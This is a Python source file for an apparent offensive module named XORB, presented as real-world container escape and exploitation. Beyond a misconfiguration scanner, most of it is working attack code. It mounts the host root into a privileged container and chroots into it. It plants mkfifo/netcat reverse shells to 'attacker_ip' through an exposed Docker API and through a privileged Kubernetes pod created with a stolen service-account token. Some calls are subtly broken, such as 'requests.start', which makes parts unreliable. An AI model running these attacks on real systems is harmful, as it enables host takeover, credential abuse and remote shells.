#!/usr/bin/env python3
"""
XORB Container Exploitation Module
Real-world container escape and exploitation techniques
"""

import docker
import os
import sys
import json
import logging
import subprocess
import requests
from datetime import datetime
from pathlib import Path
import argparse
import time
import base64
import socket

# Add XORB to Python path
XORB_ROOT = Path("/root/Xorb")
sys.path.insert(0, str(XORB_ROOT))
sys.path.insert(0, str(XORB_ROOT / "src"))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("XORB-ContainerExploit")

class ContainerExploitation:
    def __init__(self):
        self.docker_client = None
        self.k8s_client = None
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "findings": [],
            "recommendations": []
        }

    def connect_docker(self):
        """Connect to Docker daemon"""
        try:
            self.docker_client = docker.from_env()
            logger.info("‚úÖ Connected to Docker daemon")
            return True
        except Exception as e:
            logger.error(f"‚ùå Failed to connect to Docker: {e}")
            return False

    def check_container_vulnerabilities(self):
        """Check for common container vulnerabilities"""
        logger.info("üîç Scanning containers for vulnerabilities...")
        
        try:
            containers = self.docker_client.containers.list()
            if not containers:
                logger.info("üì≠ No running containers found")
                return

            for container in containers:
                container_info = container.attrs
                findings = []

                # Check 1: Privileged container
                if container_info['HostConfig']['Privileged']:
                    findings.append({
                        "vulnerability": "Privileged Container",
                        "severity": "CRITICAL",
                        "description": "Container running in privileged mode",
                        "remediation": "Run container without --privileged flag"
                    })

                # Check 2: Host PID namespace sharing
                if container_info['HostConfig']['PidMode'] == "host":
                    findings.append({
                        "vulnerability": "Host PID Namespace Sharing",
                        "severity": "HIGH",
                        "description": "Container sharing host PID namespace",
                        "remediation": "Avoid using --pid=host"
                    })

                # Check 3: Host network sharing
                if container_info['HostConfig']['NetworkMode'] == "host":
                    findings.append({
                        "vulnerability": "Host Network Sharing",
                        "severity": "HIGH",
                        "description": "Container sharing host network namespace",
                        "remediation": "Avoid using --network=host"
                    })

                # Check 4: Sensitive volumes mounted
                if container_info['Mounts']:
                    sensitive_mounts = [mount for mount in container_info['Mounts'] 
                                        if mount['Source'] in ["/", "/hostfs", "/proc"]]
                    if sensitive_mounts:
                        findings.append({
                            "vulnerability": "Sensitive Volume Mount",
                            "severity": "CRITICAL",
                            "description": f"Container has sensitive volumes mounted: {', '.join(m['Source'] for m in sensitive_mounts)}",
                            "remediation": "Only mount necessary volumes with read-only access"
                        })

                # Check 5: Running as root
                if container_info['Config'].get('User') == "":
                    findings.append({
                        "vulnerability": "Running as Root",
                        "severity": "MEDIUM",
                        "description": "Container process running as root user",
                        "remediation": "Use non-root user in Dockerfile"
                    })

                # Check 6: Exposed sensitive ports
                exposed_ports = container_info['NetworkSettings']['Ports']
                if exposed_ports:
                    sensitive_ports = [p for p in exposed_ports.keys() 
                                      if p in ["22/tcp", "3389/tcp", "5900/tcp"]]
                    if sensitive_ports:
                        findings.append({
                            "vulnerability": "Sensitive Port Exposure",
                            "severity": "MEDIUM",
                            "description": f"Container exposing sensitive ports: {', '.join(sensitive_ports)}",
                            "remediation": "Avoid exposing sensitive ports in containers"
                        })

                if findings:
                    container_report = {
                        "container_id": container.id[:12],
                        "name": container.name,
                        "image": container.image.tags[0] if container.image.tags else "unknown",
                        "findings": findings
                    }
                    self.results["findings"].append(container_report)
                    logger.info(f"‚ö†Ô∏è  Vulnerabilities found in container {container.name}")
                else:
                    logger.info(f"‚úÖ No critical vulnerabilities in container {container.name}")

        except Exception as e:
            logger.error(f"‚ùå Error scanning containers: {e}")

    def exploit_container_escape(self, container_id):
        """Attempt container escape exploit"""
        logger.info(f"üîì Attempting container escape on {container_id[:12]}...")
        
        try:
            # Create a new container with host filesystem mounted
            exploit_container = self.docker_client.containers.run(
                image="alpine",
                command="sh -c 'chroot /hostfs sh'",
                volumes={
                    "/": {"bind": "/hostfs", "mode": "rslave"}
                },
                privileged=True,
                detach=True
            )
            
            logger.info("‚úÖ Container escape exploit executed successfully")
            
            # Get host system information
            result = exploit_container.exec_run("uname -a")
            logger.info(f"üîì Host system information: {result.output.decode()}")
            
            # Clean up
            exploit_container.stop()
            exploit_container.remove()
            
            return True
            
        except Exception as e:
            logger.error(f"‚ùå Container escape failed: {e}")
            return False

    def exploit_docker_api(self):
        """Exploit exposed Docker API"""
        logger.info("üîå Attempting Docker API exploitation...")
        
        try:
            # Check if Docker API is exposed
            response = requests.get("http://localhost:2375/version", timeout=5)
            if response.status_code == 200:
                logger.info("‚úÖ Docker API is exposed on port 2375")
                
                # Create a reverse shell container
                payload = {
                    "Cmd": ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f"],
                    "Image": "alpine",
                    "AttachStdin": False,
                    "AttachStdout": False,
                    "AttachStderr": False,
                    "Privileged": True,
                    "Tty": False,
                    "OpenStdin": False,
                    "StdinOnce": False
                }
                
                response = requests.post(
                    "http://localhost:2375/containers/create",
                    json=payload
                )
                
                if response.status_code == 201:
                    container_id = response.json()["Id"]
                    logger.info(f"‚úÖ Reverse shell container created: {container_id[:12]}")
                    
                    # Start the container
                    requests.start(f"http://localhost:2375/containers/{container_id}/start")
                    logger.info("üîì Reverse shell established")
                    
                    return True
            else:
                logger.info("‚ùå Docker API not exposed")
                return False
                
        except Exception as e:
            logger.error(f"‚ùå Docker API exploitation failed: {e}")
            return False

    def exploit_kubernetes(self):
        """Exploit Kubernetes cluster vulnerabilities"""
        logger.info("‚ò∏Ô∏è  Attempting Kubernetes exploitation...")
        
        try:
            # Check for service account token
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if os.path.exists(token_path):
                with open(token_path, 'r') as f:
                    token = f.read().strip()
                
                logger.info("‚úÖ Found Kubernetes service account token")
                
                # Get API server
                host = os.getenv("KUBERNETES_SERVICE_HOST")
                port = os.getenv("KUBERNETES_SERVICE_PORT")
                
                if host and port:
                    api_url = f"https://{host}:{port}/api/v1/namespaces"
                    
                    # List namespaces
                    response = requests.get(
                        api_url,
                        headers={"Authorization": f"Bearer {token}"},
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        logger.info("‚úÖ Successfully accessed Kubernetes API")
                        
                        # Create a reverse shell pod
                        pod_manifest = {
                            "apiVersion": "v1",
                            "kind": "Pod",
                            "metadata": {"name": "reverse-shell"},
                            "spec": {
                                "containers": [{
                                    "name": "reverse-shell",
                                    "image": "alpine",
                                    "command": ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f"],
                                    "securityContext": {"privileged": True}
                                }]
                            }
                        }
                        
                        response = requests.post(
                            f"https://{host}:{port}/api/v1/namespaces/default/pods",
                            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
                            json=pod_manifest,
                            verify=False
                        )
                        
                        if response.status_code == 201:
                            logger.info("‚úÖ Reverse shell pod created in Kubernetes cluster")
                            return True
            else:
                logger.info("‚ùå Not running in Kubernetes environment")
                return False
                
        except Exception as e:
            logger.error(f"‚ùå Kubernetes exploitation failed: {e}")
            return False

    def generate_report(self):
        """Generate exploitation report"""
        report_path = f"/root/Xorb/container_exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_path, 'w') as f:
            json.dump(self.results, f, indent=2)
        logger.info(f"üìÑ Exploitation report saved to: {report_path}")
        return report_path

    def run_exploitation(self, target_container=None):
        """Run full container exploitation sequence"""
        logger.info("üöÄ Starting XORB Container Exploitation Module")
        
        # Connect to Docker
        if not self.connect_docker():
            return False
        
        # Scan containers for vulnerabilities
        self.check_container_vulnerabilities()
        
        # Attempt container escape if target specified
        if target_container:
            self.exploit_container_escape(target_container)
        
        # Attempt Docker API exploitation
        self.exploit_docker_api()
        
        # Attempt Kubernetes exploitation
        self.exploit_kubernetes()
        
        # Generate report
        self.generate_report()
        
        logger.info("üèÅ Container exploitation completed")
        return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XORB Container Exploitation Module")
    parser.add_argument("--target", help="Target container ID (optional)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    if not args.verbose:
        logging.getLogger().setLevel(logging.INFO)
    
    exploiter = ContainerExploitation()
    success = exploiter.run_exploitation(args.target)
    
    sys.exit(0 if success else 1)